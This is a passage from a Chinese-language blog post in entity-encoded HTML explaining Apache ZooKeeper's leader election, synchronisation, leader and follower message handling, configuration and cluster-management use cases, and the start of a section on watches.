FF0C;&#x65B9;&#x4FBF;&#x5728;&#x6062;&#x590D;&#x65F6;&#x8FDB;&#x884C;&#x72B6;&#x6001;&#x6062;&#x590D;&#x3002;&#x9009;&#x4E3B;&#x7684;&#x5177;&#x4F53;&#x6D41;&#x7A0B;&#x56FE;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/1.png\" alt=\"\"></p>\n<p>fast paxos&#x6D41;&#x7A0B;&#x662F;&#x5728;&#x9009;&#x4E3E;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x67D0;Server&#x9996;&#x5148;&#x5411;&#x6240;&#x6709;Server&#x63D0;&#x8BAE;&#x81EA;&#x5DF1;&#x8981;&#x6210;&#x4E3A;leader&#xFF0C;&#x5F53;&#x5176;&#x5B83;Server&#x6536;&#x5230;&#x63D0;&#x8BAE;&#x4EE5;&#x540E;&#xFF0C;&#x89E3;&#x51B3;epoch&#x548C;zxid&#x7684;&#x51B2;&#x7A81;&#xFF0C;&#x5E76;&#x63A5;&#x53D7;&#x5BF9;&#x65B9;&#x7684;&#x63D0;&#x8BAE;&#xFF0C;&#x7136;&#x540E;&#x5411;&#x5BF9;&#x65B9;&#x53D1;&#x9001;&#x63A5;&#x53D7;&#x63D0;&#x8BAE;&#x5B8C;&#x6210;&#x7684;&#x6D88;&#x606F;&#xFF0C;&#x91CD;&#x590D;&#x8FD9;&#x4E2A;&#x6D41;&#x7A0B;&#xFF0C;&#x6700;&#x540E;&#x4E00;&#x5B9A;&#x80FD;&#x9009;&#x4E3E;&#x51FA;Leader&#x3002;&#x5176;&#x6D41;&#x7A0B;&#x56FE;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/2.png\" alt=\"\"></p>\n<hr>\n<h3 id=\"&#x540C;&#x6B65;&#x6D41;&#x7A0B;\"><a href=\"#&#x540C;&#x6B65;&#x6D41;&#x7A0B;\" class=\"headerlink\" title=\"&#x540C;&#x6B65;&#x6D41;&#x7A0B;\"></a>&#x540C;&#x6B65;&#x6D41;&#x7A0B;</h3><p>&#x9009;&#x5B8C;leader&#x4EE5;&#x540E;&#xFF0C;zk&#x5C31;&#x8FDB;&#x5165;&#x72B6;&#x6001;&#x540C;&#x6B65;&#x8FC7;&#x7A0B;&#x3002;<br>1&#x3001;leader&#x7B49;&#x5F85;server&#x8FDE;&#x63A5;&#xFF1B;<br>2&#x3001;Follower&#x8FDE;&#x63A5;leader&#xFF0C;&#x5C06;&#x6700;&#x5927;&#x7684;zxid&#x53D1;&#x9001;&#x7ED9;leader&#xFF1B;<br>3&#x3001;Leader&#x6839;&#x636E;follower&#x7684;zxid&#x786E;&#x5B9A;&#x540C;&#x6B65;&#x70B9;&#xFF1B;<br>4&#x3001;&#x5B8C;&#x6210;&#x540C;&#x6B65;&#x540E;&#x901A;&#x77E5;follower &#x5DF2;&#x7ECF;&#x6210;&#x4E3A;uptodate&#x72B6;&#x6001;&#xFF1B;<br>5&#x3001;Follower&#x6536;&#x5230;uptodate&#x6D88;&#x606F;&#x540E;&#xFF0C;&#x53C8;&#x53EF;&#x4EE5;&#x91CD;&#x65B0;&#x63A5;&#x53D7;client&#x7684;&#x8BF7;&#x6C42;&#x8FDB;&#x884C;&#x670D;&#x52A1;&#x4E86;&#x3002;</p>\n<p>&#x6D41;&#x7A0B;&#x56FE;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/3.png\" alt=\"\"></p>\n<hr>\n<h3 id=\"&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;\"><a href=\"#&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;\" class=\"headerlink\" title=\"&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;\"></a>&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;</h3><h4 id=\"Leader&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;\"><a href=\"#Leader&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;\" class=\"headerlink\" title=\"Leader&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;\"></a>Leader&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;</h4><p>Leader&#x4E3B;&#x8981;&#x6709;&#x4E09;&#x4E2A;&#x529F;&#x80FD;&#xFF1A;<br>1&#x3001;&#x6062;&#x590D;&#x6570;&#x636E;&#xFF1B;<br>2&#x3001;&#x7EF4;&#x6301;&#x4E0E;Learner&#x7684;&#x5FC3;&#x8DF3;&#xFF0C;&#x63A5;&#x6536;Learner&#x8BF7;&#x6C42;&#x5E76;&#x5224;&#x65AD;Learner&#x7684;&#x8BF7;&#x6C42;&#x6D88;&#x606F;&#x7C7B;&#x578B;&#xFF1B;<br>3&#x3001;Learner&#x7684;&#x6D88;&#x606F;&#x7C7B;&#x578B;&#x4E3B;&#x8981;&#x6709;PING&#x6D88;&#x606F;&#x3001;REQUEST&#x6D88;&#x606F;&#x3001;ACK&#x6D88;&#x606F;&#x3001;REVALIDATE&#x6D88;&#x606F;&#xFF0C;&#x6839;&#x636E;&#x4E0D;&#x540C;&#x7684;&#x6D88;&#x606F;&#x7C7B;&#x578B;&#xFF0C;&#x8FDB;&#x884C;&#x4E0D;&#x540C;&#x7684;&#x5904;&#x7406;&#x3002;</p>\n<p>PING&#x6D88;&#x606F;&#x662F;&#x6307;Learner&#x7684;&#x5FC3;&#x8DF3;&#x4FE1;&#x606F;&#xFF1B;REQUEST&#x6D88;&#x606F;&#x662F;Follower&#x53D1;&#x9001;&#x7684;&#x63D0;&#x8BAE;&#x4FE1;&#x606F;&#xFF0C;&#x5305;&#x62EC;&#x5199;&#x8BF7;&#x6C42;&#x53CA;&#x540C;&#x6B65;&#x8BF7;&#x6C42;&#xFF1B;ACK&#x6D88;&#x606F;&#x662F;Follower&#x7684;&#x5BF9;&#x63D0;&#x8BAE;&#x7684;&#x56DE;&#x590D;&#xFF0C;&#x8D85;&#x8FC7;&#x534A;&#x6570;&#x7684;Follower&#x901A;&#x8FC7;&#xFF0C;&#x5219;commit&#x8BE5;&#x63D0;&#x8BAE;&#xFF1B;REVALIDATE&#x6D88;&#x606F;&#x662F;&#x7528;&#x6765;&#x5EF6;&#x957F;SESSION&#x6709;&#x6548;&#x65F6;&#x95F4;&#x3002;</p>\n<p>Leader&#x7684;&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;&#x7B80;&#x56FE;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF0C;&#x5728;&#x5B9E;&#x9645;&#x5B9E;&#x73B0;&#x4E2D;&#xFF0C;&#x6D41;&#x7A0B;&#x8981;&#x6BD4;&#x4E0B;&#x56FE;&#x590D;&#x6742;&#x5F97;&#x591A;&#xFF0C;&#x542F;&#x52A8;&#x4E86;&#x4E09;&#x4E2A;&#x7EBF;&#x7A0B;&#x6765;&#x5B9E;&#x73B0;&#x529F;&#x80FD;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/4.png\" alt=\"\"></p>\n<h4 id=\"Follower&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;\"><a href=\"#Follower&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;\" class=\"headerlink\" title=\"Follower&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;\"></a>Follower&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;</h4><p>Follower&#x4E3B;&#x8981;&#x6709;&#x56DB;&#x4E2A;&#x529F;&#x80FD;&#xFF1A;<br>1&#x3001;&#x5411;Leader&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#xFF08;PING&#x6D88;&#x606F;&#x3001;REQUEST&#x6D88;&#x606F;&#x3001;ACK&#x6D88;&#x606F;&#x3001;REVALIDATE&#x6D88;&#x606F;&#xFF09;&#xFF1B;<br>2&#x3001;&#x63A5;&#x6536;Leader&#x6D88;&#x606F;&#x5E76;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF1B;<br>3&#x3001;&#x63A5;&#x6536;Client&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x5982;&#x679C;&#x4E3A;&#x5199;&#x8BF7;&#x6C42;&#xFF0C;&#x53D1;&#x9001;&#x7ED9;Leader&#x8FDB;&#x884C;&#x6295;&#x7968;&#xFF1B;<br>4&#x3001;&#x8FD4;&#x56DE;Client&#x7ED3;&#x679C;&#x3002;</p>\n<p>Follower&#x7684;&#x6D88;&#x606F;&#x5FAA;&#x73AF;&#x5904;&#x7406;&#x5982;&#x4E0B;&#x51E0;&#x79CD;&#x6765;&#x81EA;Leader&#x7684;&#x6D88;&#x606F;&#xFF1A;</p>\n<p>1&#x3001;ING&#x6D88;&#x606F;&#xFF1A; &#x5FC3;&#x8DF3;&#x6D88;&#x606F;&#xFF1B;<br>2&#x3001;PROPOSAL&#x6D88;&#x606F;&#xFF1A;Leader&#x53D1;&#x8D77;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x8981;&#x6C42;Follower&#x6295;&#x7968;&#xFF1B;<br>3&#x3001;COMMIT&#x6D88;&#x606F;&#xFF1A;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x6700;&#x65B0;&#x4E00;&#x6B21;&#x63D0;&#x6848;&#x7684;&#x4FE1;&#x606F;&#xFF1B;<br>4&#x3001;UPTODATE&#x6D88;&#x606F;&#xFF1A;&#x8868;&#x660E;&#x540C;&#x6B65;&#x5B8C;&#x6210;&#xFF1B;<br>5&#x3001;REVALIDATE&#x6D88;&#x606F;&#xFF1A;&#x6839;&#x636E;Leader&#x7684;REVALIDATE&#x7ED3;&#x679C;&#xFF0C;&#x5173;&#x95ED;&#x5F85;revalidate&#x7684;session&#x8FD8;&#x662F;&#x5141;&#x8BB8;&#x5176;&#x63A5;&#x53D7;&#x6D88;&#x606F;&#xFF1B;<br>6&#x3001;SYNC&#x6D88;&#x606F;&#xFF1A;&#x8FD4;&#x56DE;SYNC&#x7ED3;&#x679C;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x8FD9;&#x4E2A;&#x6D88;&#x606F;&#x6700;&#x521D;&#x7531;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x8D77;&#xFF0C;&#x7528;&#x6765;&#x5F3A;&#x5236;&#x5F97;&#x5230;&#x6700;&#x65B0;&#x7684;&#x66F4;&#x65B0;&#x3002;</p>\n<p>Follower&#x7684;&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;&#x7B80;&#x56FE;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF0C;&#x5728;&#x5B9E;&#x9645;&#x5B9E;&#x73B0;&#x4E2D;&#xFF0C;Follower&#x662F;&#x901A;&#x8FC7;5&#x4E2A;&#x7EBF;&#x7A0B;&#x6765;&#x5B9E;&#x73B0;&#x529F;&#x80FD;&#x7684;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/5.png\" alt=\"\"></p>\n<p>&#x5BF9;&#x4E8E;observer&#x7684;&#x6D41;&#x7A0B;&#x4E0D;&#x518D;&#x53D9;&#x8FF0;&#xFF0C;observer&#x6D41;&#x7A0B;&#x548C;Follower&#x7684;&#x552F;&#x4E00;&#x4E0D;&#x540C;&#x7684;&#x5730;&#x65B9;&#x5C31;&#x662F;observer&#x4E0D;&#x4F1A;&#x53C2;&#x52A0;leader&#x53D1;&#x8D77;&#x7684;&#x6295;&#x7968;&#x3002;</p>\n<hr>\n<h3 id=\"&#x4E3B;&#x6D41;&#x5E94;&#x7528;&#x573A;&#x666F;\"><a href=\"#&#x4E3B;&#x6D41;&#x5E94;&#x7528;&#x573A;&#x666F;\" class=\"headerlink\" title=\"&#x4E3B;&#x6D41;&#x5E94;&#x7528;&#x573A;&#x666F;\"></a>&#x4E3B;&#x6D41;&#x5E94;&#x7528;&#x573A;&#x666F;</h3><p>Zookeeper&#x7684;&#x4E3B;&#x6D41;&#x5E94;&#x7528;&#x573A;&#x666F;&#x5B9E;&#x73B0;&#x601D;&#x8DEF;&#xFF08;&#x9664;&#x53BB;&#x5B98;&#x65B9;&#x793A;&#x4F8B;&#xFF09; </p>\n<h4 id=\"&#x914D;&#x7F6E;&#x7BA1;&#x7406;\"><a href=\"#&#x914D;&#x7F6E;&#x7BA1;&#x7406;\" class=\"headerlink\" title=\"&#x914D;&#x7F6E;&#x7BA1;&#x7406;\"></a>&#x914D;&#x7F6E;&#x7BA1;&#x7406;</h4><p>&#x96C6;&#x4E2D;&#x5F0F;&#x7684;&#x914D;&#x7F6E;&#x7BA1;&#x7406;&#x5728;&#x5E94;&#x7528;&#x96C6;&#x7FA4;&#x4E2D;&#x662F;&#x975E;&#x5E38;&#x5E38;&#x89C1;&#x7684;&#xFF0C;&#x4E00;&#x822C;&#x5546;&#x4E1A;&#x516C;&#x53F8;&#x5185;&#x90E8;&#x90FD;&#x4F1A;&#x5B9E;&#x73B0;&#x4E00;&#x5957;&#x96C6;&#x4E2D;&#x7684;&#x914D;&#x7F6E;&#x7BA1;&#x7406;&#x4E2D;&#x5FC3;&#xFF0C;&#x5E94;&#x5BF9;&#x4E0D;&#x540C;&#x7684;&#x5E94;&#x7528;&#x96C6;&#x7FA4;&#x5BF9;&#x4E8E;&#x5171;&#x4EAB;&#x5404;&#x81EA;&#x914D;&#x7F6E;&#x7684;&#x9700;&#x6C42;&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x914D;&#x7F6E;&#x53D8;&#x66F4;&#x65F6;&#x80FD;&#x591F;&#x901A;&#x77E5;&#x5230;&#x96C6;&#x7FA4;&#x4E2D;&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x673A;&#x5668;&#x3002;</p>\n<p>Zookeeper&#x5F88;&#x5BB9;&#x6613;&#x5B9E;&#x73B0;&#x8FD9;&#x79CD;&#x96C6;&#x4E2D;&#x5F0F;&#x7684;&#x914D;&#x7F6E;&#x7BA1;&#x7406;&#xFF0C;&#x6BD4;&#x5982;&#x5C06;APP1&#x7684;&#x6240;&#x6709;&#x914D;&#x7F6E;&#x914D;&#x7F6E;&#x5230;/APP1 znode&#x4E0B;&#xFF0C;APP1&#x6240;&#x6709;&#x673A;&#x5668;&#x4E00;&#x542F;&#x52A8;&#x5C31;&#x5BF9;/APP1&#x8FD9;&#x4E2A;&#x8282;&#x70B9;&#x8FDB;&#x884C;&#x76D1;&#x63A7;(zk.exist(&#x201C;/APP1&#x201D;,true)),&#x5E76;&#x4E14;&#x5B9E;&#x73B0;&#x56DE;&#x8C03;&#x65B9;&#x6CD5;Watcher&#xFF0C;&#x90A3;&#x4E48;&#x5728;zookeeper&#x4E0A;/APP1 znode&#x8282;&#x70B9;&#x4E0B;&#x6570;&#x636E;&#x53D1;&#x751F;&#x53D8;&#x5316;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6BCF;&#x4E2A;&#x673A;&#x5668;&#x90FD;&#x4F1A;&#x6536;&#x5230;&#x901A;&#x77E5;&#xFF0C;Watcher&#x65B9;&#x6CD5;&#x5C06;&#x4F1A;&#x88AB;&#x6267;&#x884C;&#xFF0C;&#x90A3;&#x4E48;&#x5E94;&#x7528;&#x518D;&#x53D6;&#x4E0B;&#x6570;&#x636E;&#x5373;&#x53EF;(zk.getData(&#x201C;/APP1&#x201D;,false,null));</p>\n<p>&#x4EE5;&#x4E0A;&#x8FD9;&#x4E2A;&#x4F8B;&#x5B50;&#x53EA;&#x662F;&#x7B80;&#x5355;&#x7684;&#x7C97;&#x9897;&#x7C92;&#x5EA6;&#x914D;&#x7F6E;&#x76D1;&#x63A7;&#xFF0C;&#x7EC6;&#x9897;&#x7C92;&#x5EA6;&#x7684;&#x6570;&#x636E;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x5206;&#x5C42;&#x7EA7;&#x76D1;&#x63A7;&#xFF0C;&#x8FD9;&#x4E00;&#x5207;&#x90FD;&#x662F;&#x53EF;&#x4EE5;&#x8BBE;&#x8BA1;&#x548C;&#x63A7;&#x5236;&#x7684;&#x3002;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Zookeeper%E5%8E%9F%E7%90%86/6.png\" alt=\"\"></p>\n<h4 id=\"&#x96C6;&#x7FA4;&#x7BA1;&#x7406;\"><a href=\"#&#x96C6;&#x7FA4;&#x7BA1;&#x7406;\" class=\"headerlink\" title=\"&#x96C6;&#x7FA4;&#x7BA1;&#x7406;\"></a>&#x96C6;&#x7FA4;&#x7BA1;&#x7406;</h4><p>&#x5E94;&#x7528;&#x96C6;&#x7FA4;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x5E38;&#x5E38;&#x9700;&#x8981;&#x8BA9;&#x6BCF;&#x4E00;&#x4E2A;&#x673A;&#x5668;&#x77E5;&#x9053;&#x96C6;&#x7FA4;&#x4E2D;&#xFF08;&#x6216;&#x4F9D;&#x8D56;&#x7684;&#x5176;&#x4ED6;&#x67D0;&#x4E00;&#x4E2A;&#x96C6;&#x7FA4;&#xFF09;&#x54EA;&#x4E9B;&#x673A;&#x5668;&#x662F;&#x6D3B;&#x7740;&#x7684;&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x96C6;&#x7FA4;&#x673A;&#x5668;&#x56E0;&#x4E3A;&#x5B95;&#x673A;&#xFF0C;&#x7F51;&#x7EDC;&#x65AD;&#x94FE;&#x7B49;&#x539F;&#x56E0;&#x80FD;&#x591F;&#x4E0D;&#x5728;&#x4EBA;&#x5DE5;&#x4ECB;&#x5165;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x8FC5;&#x901F;&#x901A;&#x77E5;&#x5230;&#x6BCF;&#x4E00;&#x4E2A;&#x673A;&#x5668;&#x3002;</p>\n<p>Zookeeper&#x540C;&#x6837;&#x5F88;&#x5BB9;&#x6613;&#x5B9E;&#x73B0;&#x8FD9;&#x4E2A;&#x529F;&#x80FD;&#xFF0C;&#x6BD4;&#x5982;&#x6211;&#x5728;zookeeper&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x6709;&#x4E00;&#x4E2A;znode&#x53EB;/APP1SERVERS,&#x90A3;&#x4E48;&#x96C6;&#x7FA4;&#x4E2D;&#x6BCF;&#x4E00;&#x4E2A;&#x673A;&#x5668;&#x542F;&#x52A8;&#x7684;&#x65F6;&#x5019;&#x90FD;&#x53BB;&#x8FD9;&#x4E2A;&#x8282;&#x70B9;&#x4E0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;EPHEMERAL&#x7C7B;&#x578B;&#x7684;&#x8282;&#x70B9;&#xFF0C;&#x6BD4;&#x5982;server1&#x521B;&#x5EFA;/APP1SERVERS/SERVER1(&#x53EF;&#x4EE5;&#x4F7F;&#x7528;ip,&#x4FDD;&#x8BC1;&#x4E0D;&#x91CD;&#x590D;)&#xFF0C;server2&#x521B;&#x5EFA;/APP1SERVERS/SERVER2&#xFF0C;&#x7136;&#x540E;SERVER1&#x548C;SERVER2&#x90FD;watch /APP1SERVERS&#x8FD9;&#x4E2A;&#x7236;&#x8282;&#x70B9;&#xFF0C;&#x90A3;&#x4E48;&#x4E5F;&#x5C31;&#x662F;&#x8FD9;&#x4E2A;&#x7236;&#x8282;&#x70B9;&#x4E0B;&#x6570;&#x636E;&#x6216;&#x8005;&#x5B50;&#x8282;&#x70B9;&#x53D8;&#x5316;&#x90FD;&#x4F1A;&#x901A;&#x77E5;&#x5BF9;&#x8BE5;&#x8282;&#x70B9;&#x8FDB;&#x884C;watch&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x3002;&#x56E0;&#x4E3A;EPHEMERAL&#x7C7B;&#x578B;&#x8282;&#x70B9;&#x6709;&#x4E00;&#x4E2A;&#x5F88;&#x91CD;&#x8981;&#x7684;&#x7279;&#x6027;&#xFF0C;&#x5C31;&#x662F;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x8FDE;&#x63A5;&#x65AD;&#x6389;&#x6216;&#x8005;session&#x8FC7;&#x671F;&#x5C31;&#x4F1A;&#x4F7F;&#x8282;&#x70B9;&#x6D88;&#x5931;&#xFF0C;&#x90A3;&#x4E48;&#x5728;&#x67D0;&#x4E00;&#x4E2A;&#x673A;&#x5668;&#x6302;&#x6389;&#x6216;&#x8005;&#x65AD;&#x94FE;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5176;&#x5BF9;&#x5E94;&#x7684;&#x8282;&#x70B9;&#x5C31;&#x4F1A;&#x6D88;&#x5931;&#xFF0C;&#x7136;&#x540E;&#x96C6;&#x7FA4;&#x4E2D;&#x6240;&#x6709;&#x5BF9;/APP1SERVERS&#x8FDB;&#x884C;watch&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x90FD;&#x4F1A;&#x6536;&#x5230;&#x901A;&#x77E5;&#xFF0C;&#x7136;&#x540E;&#x53D6;&#x5F97;&#x6700;&#x65B0;&#x5217;&#x8868;&#x5373;&#x53EF;&#x3002;</p>\n<p>&#x53E6;&#x5916;&#x6709;&#x4E00;&#x4E2A;&#x5E94;&#x7528;&#x573A;&#x666F;&#x5C31;&#x662F;&#x96C6;&#x7FA4;&#x9009;master,&#x4E00;&#x65E6;master&#x6302;&#x6389;&#x80FD;&#x591F;&#x9A6C;&#x4E0A;&#x80FD;&#x4ECE;slave&#x4E2D;&#x9009;&#x51FA;&#x4E00;&#x4E2A;master,&#x5B9E;&#x73B0;&#x6B65;&#x9AA4;&#x548C;&#x524D;&#x8005;&#x4E00;&#x6837;&#xFF0C;&#x53EA;&#x662F;&#x673A;&#x5668;&#x5728;&#x542F;&#x52A8;&#x7684;&#x65F6;&#x5019;&#x5728;APP1SERVERS&#x521B;&#x5EFA;&#x7684;&#x8282;&#x70B9;&#x7C7B;&#x578B;&#x53D8;&#x4E3A;EPHEMERAL_SEQUENTIAL&#x7C7B;&#x578B;&#xFF0C;&#x8FD9;&#x6837;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x4F1A;&#x81EA;&#x52A8;&#x88AB;&#x7F16;&#x53F7;</p>\n<p>&#x6211;&#x4EEC;&#x9ED8;&#x8BA4;&#x89C4;&#x5B9A;&#x7F16;&#x53F7;&#x6700;&#x5C0F;&#x7684;&#x4E3A;master,&#x6240;&#x4EE5;&#x5F53;&#x6211;&#x4EEC;&#x5BF9;/APP1SERVERS&#x8282;&#x70B9;&#x505A;&#x76D1;&#x63A7;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5F97;&#x5230;&#x670D;&#x52A1;&#x5668;&#x5217;&#x8868;&#xFF0C;&#x53EA;&#x8981;&#x6240;&#x6709;&#x96C6;&#x7FA4;&#x673A;&#x5668;&#x903B;&#x8F91;&#x8BA4;&#x4E3A;&#x6700;&#x5C0F;&#x7F16;&#x53F7;&#x8282;&#x70B9;&#x4E3A;master&#xFF0C;&#x90A3;&#x4E48;master&#x5C31;&#x88AB;&#x9009;&#x51FA;&#xFF0C;&#x800C;&#x8FD9;&#x4E2A;master&#x5B95;&#x673A;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x76F8;&#x5E94;&#x7684;znode&#x4F1A;&#x6D88;&#x5931;&#xFF0C;&#x7136;&#x540E;&#x65B0;&#x7684;&#x670D;&#x52A1;&#x5668;&#x5217;&#x8868;&#x5C31;&#x88AB;&#x63A8;&#x9001;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x7136;&#x540E;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x903B;&#x8F91;&#x8BA4;&#x4E3A;&#x6700;&#x5C0F;&#x7F16;&#x53F7;&#x8282;&#x70B9;&#x4E3A;master&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x505A;&#x5230;&#x52A8;&#x6001;master&#x9009;&#x4E3E;&#x3002;<br><img src=\"/2016/05/19/Zookeeper&#x539F;&#x7406;/7.png\" alt=\"\"></p>\n<hr>\n<h3 id=\"Zookeeper&#x76D1;&#x89C6;&#x7B80;&#x4ECB;\"><a href=\"#Zookeeper&#x76D1;&#x89C6;&#x7B80;&#x4ECB;\" class=\"headerlink\" title=\"Zookeeper&#x76D1;&#x89C6;&#x7B80;&#x4ECB;\"></a>Zookeeper&#x76D1;&#x89C6;&#x7B80;&#x4ECB;</h3><p>Zookeeper C API &#x7684;&#x58F0;&#x660E;&#x548C;&#x63CF;&#x8FF0;&#x5728; include/zookeeper.h &#x4E2D;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#xFF0C;&#x53E6;&#x5916;&#x5927;&#x90E8;&#x5206;&#x7684; Zookeeper C API &#x5E38;&#x91CF;&#x3001;&#x7ED3;&#x6784;&#x4F53;&#x58F0;&#x660E;&#x4E5F;&#x5728; zookeeper.h &#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x5982;&#x679C;&#x4F60;&#x5728;&#x4F7F;&#x7528; C API &#x662F;&#x9047;&#x5230;&#x4E0D;&#x660E;&#x767D;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x6700;&#x597D;&#x770B;&#x770B; zookeeper.h&#xFF0C;&#x6216;&#x8005;&#x81EA;&#x5DF1;&#x4F7F;&#x7528; doxygen &#x751F;&#x6210; Zookeeper C API &#x7684;&#x5E2E;&#x52A9;&#x6587;&#x6863;&#x3002;</p>\n<p>Zookeeper &#x4E2D;&#x6700;&#x6709;&#x7279;&#x8272;&#x4E14;&#x6700;&#x4E0D;&#x5BB9;&#x6613;&#x7406;&#x89E3;&#x7684;&#x662F;&#x76D1;&#x89C6;(Watches)&#x3002;Zookeeper &#x6240;&#x6709;&#x7684;&#x8BFB;&#x64CD;&#x4F5C;&#x2014;&#x2014;getData(), getChildren(), &#x548C; exists() &#x90FD; &#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x76D1;&#x89C6;(watch)&#xFF0C;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x4E3A;&#x4E00;&#x6B21;&#x6027;&#x7684;&#x89E6;&#x53D1;&#x5668;&#xFF0C; &#x5B98;&#x65B9;&#x5B9A;&#x4E49;&#x5982;&#x4E0B;&#xFF1A; a watch event is one-time trigger, sent to the client that set the watch, which occurs when the data for which the watch was set changes&#x3002;&#x5BF9;&#x6B64;&#x9700;&#x8981;&#x4F5C;&#x51FA;&#x5982;&#x4E0B;&#x7406;&#x89E3;&#xFF1A;</p>\n<ul>\n<li><p>One-time trigge&#xFF08;&#x4E00;&#x6B21;&#x6027;&#x89E6;&#x53D1;&#xFF09;</p>\n<p>&#x5F53;&#x8BBE;&#x7F6E;&#x76D1;&#x89C6;&#x7684;&#x6570;&#x636E;&#x53D1;&#x751F;&#x6539;&#x53D8;&#x65F6;&#xFF0C;&#x8BE5;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#x4F1A;&#x88AB;&#x53D1;&#x9001;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x5982;&#x679C;&#x5BA2;&#x6237;&#x7AEF;&#x8C03;&#x7528;&#x4E86; getData(&#x201C;/znode1&#x201D;, true) &#x5E76;&#x4E14;&#x7A0D;&#x540E; /znode1 &#x8282;&#x70B9;&#x4E0A;&#x7684;&#x6570;&#x636E;&#x53D1;&#x751F;&#x4E86;&#x6539;&#x53D8;&#x6216;&#x8005;&#x88AB;&#x5220;&#x9664;&#x4E86;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x5C06;&#x4F1A;&#x83B7;&#x53D6;&#x5230; /znode1 &#x53D1;&#x751F;&#x53D8;&#x5316;&#x7684;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#xFF0C;&#x800C;&#x5982;&#x679C; /znode1 &#x518D;&#x4E00;&#x6B21;&#x53D1;&#x751F;&#x4E86;&#x53D8;&#x5316;&#xFF0C;&#x9664;&#x975E;&#x5BA2;&#x6237;&#x7AEF;&#x518D;&#x6B21;&#x5BF9; /znode1 &#x8BBE;&#x7F6E;&#x76D1;&#x89C6;&#xFF0C;&#x5426;&#x5219;&#x5BA2;&#x6237;&#x7AEF;&#x4E0D;&#x4F1A;&#x6536;&#x5230;&#x4E8B;&#x4EF6;&#x901A;&#x77E5;&#x3002;</p>\n</li>\n<li><p>Sent to the client&#xFF08;&#x53D1;&#x9001;&#x81F3;&#x5BA2;&#x6237;&#x7AEF;&#xFF09;</p>\n<p>Zookeeper &#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x7AEF;&#x662F;&#x901A;&#x8FC7; socket &#x8FDB;&#x884C;&#x901A;&#x4FE1;&#x7684;&#xFF0C;&#x7531;&#x4E8E;&#x7F51;&#x7EDC;&#x5B58;&#x5728;&#x6545;&#x969C;&#xFF0C;&#x6240;&#x4EE5;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x4E0D;&#x4F1A;&#x6210;&#x529F;&#x5730;&#x5230;&#x8FBE;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#x662F;&#x5F02;&#x6B65;&#x53D1;&#x9001;&#x81F3;&#x76D1;&#x89C6;&#x8005;&#x7684;&#xFF0C;Zookeeper 